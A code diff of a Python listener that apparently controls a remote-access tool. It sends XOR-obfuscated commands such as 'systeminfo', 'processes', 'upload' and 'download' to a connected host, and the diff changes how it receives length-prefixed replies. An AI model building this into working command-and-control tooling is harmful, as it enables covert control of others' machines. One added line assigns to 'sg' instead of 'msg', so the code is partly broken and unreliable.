@@ -22,12 +22,12 @@ end
 
 OPTIONS = ["upload", "download", "systeminfo", "processes", "help", "end"] #available commands
 
-def xor(message):
-    newMessage = "" # init empty string
-    for char in message:
-        deChar = ord(str(char)) ^ ord('P') # compute xor for ascii value of char and P
-        newMessage += str(chr(deChar)) # append to new newMessage
-    return str.encode(newMessage) # return result
+def xor(msg):
+    newMsg = "" # init empty string
+    for char in msg:
+        decrChar = ord(str(char)) ^ ord('P') # compute xor for ascii value of char and P
+        newMsg += str(chr(decrChar)) # append to new newMessage
+    return str.encode(newMsg) # return result in bytes
 
 while True: 
     print("Accepting...")
@@ -134,16 +134,27 @@ while True:
             '''
             break
         elif userInput.lower() == "systeminfo" or userInput.lower() == "processes":
-            userInput = xor(userInput)
-            conn.sendall(userInput)
-            recv = conn.recv(1024)
-            print(recv.decode())
-            msg = xor(recv.decode())
-            print(msg)
-            while "gettfouttahereistfg" not in msg.decode(): # continue receiving and decrypting messages until a specific marker is hit
-                print(msg)
-                recv = conn.recv(1024)
-                msg = xor(recv)
+            userInput = xor(userInput)  # xor user input
+            conn.sendall(userInput)  # send xor'd user input
+            recv = conn.recv(5).decode()  # recieve incoming message length
+            print(f"message length encoded: {recv}")  # print decoded recieved data
+            msg = xor(recv)  # decode the message received
+            # turn message length into hex (message may be padded with 'P') 
+            msgLen = int(msg, 16)  # turn msgLen into hex int
+            print(f"message length: {msgLen}")
+            
+            
+            while msgLen > 0: # when message length is less than 0, stop recieving
+                if msgLen < 1024:  # if message length is less than 1024, only recieve the rest of the message
+                    recv = conn.recv(msgLen).decode()
+                    msg = xor(recv)
+                else:  # otherwise recieve 1024 bytes at a time
+                    recv = conn.recv(1024).decode()
+                    sg = xor(recv)
+                    
+                print(f"message decoded: {msg}")
+                msgLen = msgLen - 1024  # decrement message length
+                
         elif "help" in userInput.lower():
             print(options)
             
